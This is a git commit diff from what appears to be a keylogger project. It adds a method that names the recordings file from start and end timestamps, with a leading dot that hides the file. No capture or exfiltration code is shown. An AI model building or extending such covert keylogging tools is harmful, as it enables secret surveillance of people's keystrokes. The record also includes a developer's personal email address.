b30e995ace9de54911f7d261d4cb1d905daaa261
schorio <schorioignace@gmail.com>
2024-03-25 12:59:53 +0100

    methode pour definir le nom des fichiers contenant les enregistrements

--- core/keylogger.py
+++ core/keylogger.py
@@ -6,3 +6,8 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
         self.filename = ""
+        
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f".{start_dt_str}_{end_dt_str}"
